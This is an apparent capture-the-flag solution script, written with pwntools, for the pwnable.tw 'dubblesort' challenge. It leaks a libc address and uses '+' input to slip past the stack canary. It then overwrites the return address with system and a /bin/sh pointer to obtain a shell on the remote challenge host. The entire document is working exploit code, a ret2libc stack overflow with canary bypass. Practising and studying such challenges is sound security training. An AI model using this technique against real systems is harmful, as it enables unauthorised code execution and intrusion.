
from pwn import *
# s=process("./dubblesort")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
s=remote("chall.pwnable.tw",10101)
libc = ELF("./libc_32.so.6")

# gdb.attach(s,"b * main + 90\n c")
# pause()
s.sendline("A"*24)
s.recvuntil("\n")
leak = u32("\x00"+s.recv(3))
libc.address = leak - 0x01b0000 #local 0x1d8000
system =libc.symbols['system']
binsh = next(libc.search("/bin/sh"))

log.info("leak {}".format(hex(leak)))
log.info("base {}".format(hex(libc.address)))
log.info("system {}".format(hex(system)))
log.info("binsh {}".format(hex(binsh)))


s.recvuntil("How many numbers do you what to sort :")
s.sendline("35")

for i in range(24):
    s.recvuntil("number :")
    s.sendline("0")

s.recvuntil("number :")
s.sendline("+")
for i in range(7):
    s.recvuntil("number :")
    s.sendline(str(system-7))

s.recvuntil("number :")
s.sendline(str(system))
s.recvuntil("number :")
s.sendline(str(system))
s.recvuntil("number :")
s.sendline(str(binsh))

s.interactive()